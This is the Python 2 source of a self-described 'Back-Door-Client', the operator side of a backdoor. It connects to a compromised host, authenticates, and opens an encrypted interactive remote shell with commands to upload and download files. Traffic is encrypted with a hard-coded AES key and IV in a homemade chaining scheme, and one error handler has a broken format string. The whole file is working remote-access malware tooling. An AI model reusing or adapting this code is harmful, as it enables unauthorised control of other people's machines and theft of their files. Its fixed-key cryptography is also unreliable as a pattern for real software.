#!/usr/bin/python2.7
# -*- coding:utf-8 -*-

__doc__ = """
# Name    :  Back-Door-Client
# Author  :  Shinukami
# Date    :  2016-3-14
# Version :  0.0.4
"""

import os, socket, sys, struct
try:
    from Crypto.Cipher import AES
except ImportError:
    print "Please install pycrypto by : pip install pycrypto"

class Cipher(object):

    def __init__(self):
        self.IV   = "C1^s$gbPF]'+>,~`"
        self.key  = "Z1v.#6KpSln2X@,}"
        self.Cobj = AES.new(self.key, AES.MODE_ECB)

    def pad(self, instr, length):
        if(length == None): raise Exception("Function pad : Null pad-length")
        elif(len(instr) % length == 0):return instr
        else:return instr + '\x04' * (length - (len(instr) % length ))

    def encrypt_block(self, plaintext):
        return self.Cobj.encrypt(plaintext)

    def decrypt_block(self, ctxt):
        return self.Cobj.decrypt(ctxt)

    def xor_block(self, first, second):
        if(len(first) != len(second)): raise Exception("Function xor_block : Not equal length !")
        first = list(first)
        second = list(second)
        for i in range(0,len(first)):
            first[i] = chr(ord(first[i]) ^ ord(second[i]))
        return ''.join(first)

    def Encrypt(self, plaintext):
        if(len(plaintext) % len(self.key) != 0):
            plaintext = self.pad(plaintext,len(self.key))
        blocks = [plaintext[x:x+len(self.key)] for x in range(0,len(plaintext),len(self.key))]
        for i in range(0,len(blocks)):
            if (i == 0):
                ctxt = self.xor_block(blocks[i],self.IV)
                ctxt = self.encrypt_block(ctxt)
            else:
                tmp = self.xor_block(blocks[i],ctxt[-1 * (len(self.key) ):])
                ctxt = ctxt + self.encrypt_block(tmp)
        return ctxt

    def Decrypt(self, ctxt):
        if(len(ctxt) % len(self.key) != 0):
            raise Exception("Invalid Key.")
        blocks = [ctxt[x:x+len(self.key)] for x in range(0,len(ctxt),len(self.key))]
        for i in range(0,len(blocks)):
            if (i == 0):
                ptxt = self.decrypt_block(blocks[i])
                ptxt = self.xor_block(ptxt,self.IV)
            else:
                tmp = self.decrypt_block(blocks[i])
                tmp = self.xor_block(tmp,blocks[i-1])
                ptxt = ptxt + tmp
        return ptxt.strip('\x04')

class BackDoorClient(object):

    def __init__(self):
        self.host = sys.argv[1]
        self.port = int(sys.argv[2])
        self.BUFSIZE = 1024

        self.FILEINFO_SIZE=struct.calcsize('128s1s1I')
        self.DATAINFO_SIZE=struct.calcsize('1024s')

        self.I = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
        self.Shell_command = ["ls","cd","pwd","delete","help"]

        self.Crypto = Cipher()

    def Upload(self,filename):
        f = open(filename,'rb')
        new_f = open("new"+filename,'wb')
        new_f.write( self.Crypto.Encrypt(f.read()))
        new_f.close()
        f.close()
        size = os.stat("new"+filename).st_size
        fhead = struct.pack('128s1s1I',filename,'|',size)
        fhead = self.Crypto.Encrypt(fhead)
        self.I.send(fhead)
        f = open('new'+filename,'rb')
        try:
            while 1:
                Upload_Data = f.read(self.BUFSIZE)
                if not Upload_Data:break
                sent = self.I.send(Upload_Data)
            f.close()
            os.remove("new"+filename)
        except Exception as error_code:
            print "Exception occur : %s"%(error_code, filename)

    def Download(self,filename):
        fhead = self.I.recv(self.FILEINFO_SIZE)
        filenameS,temp,filesize=struct.unpack('128s1s1I',fhead)
        restsize = filesize
        f = open(filename.split("/")[-1],"wb")
        data = ""
        while True:
            if restsize > self.BUFSIZE:
                Download_Data = self.I.recv(self.BUFSIZE)
            else:
                Download_Data = self.I.recv(restsize)
            if not Download_Data:break
            data += Download_Data
            restsize = restsize-len(Download_Data)
            if restsize == 0:break
        f.write(self.Crypto.Decrypt(data))
        f.close()

    def BackShell(self):
        while 1:
            Data_recv = self.I.recv(self.DATAINFO_SIZE)
            Data_recv = self.Crypto.Decrypt(Data_recv)
            Data_recv = struct.unpack('1024s',Data_recv)[0].strip('\00')
            print Data_recv,
            CMD = raw_input("""$ """)
            send_pac = self.Crypto.Encrypt(struct.pack('1024s',CMD))
            self.I.send(send_pac)
            CMD = CMD.split(" ")
            if CMD[0] == "download":
                self.Download(CMD[1])
            elif CMD[0] == "upload":
                self.Upload(CMD[1])
            elif CMD[0] in self.Shell_command:
                Data_recv = self.I.recv(self.DATAINFO_SIZE)
                Data_recv = self.Crypto.Decrypt(Data_recv)
                Data_recv = struct.unpack('1024s',Data_recv)[0].strip('\00')
                print Data_recv

    def Authenticate(self):
        Information = raw_input("Input you account as :Name|password  #")
        Information = struct.pack("1024s",Information)
        Information = self.Crypto.Encrypt(Information)
        self.I.send(Information)
        Information = self.I.recv(self.DATAINFO_SIZE)
        Information = self.Crypto.Decrypt(Information)
        Information = struct.unpack('1024s',Information)[0].strip('\00')
        print Information

    def Start(self):
        try:
            self.I.connect((self.host,self.port))
            self.Authenticate()
        except Exception as e:
            print "Error : %s"%(e)
            self.I.close()
            sys.exit()
        try:
            self.BackShell()
        except Exception as e:
            print "Error : %s"%(e)
        finally:
            self.I.close()

if __name__ == "__main__":
    Client = BackDoorClient()
    Client.Start()
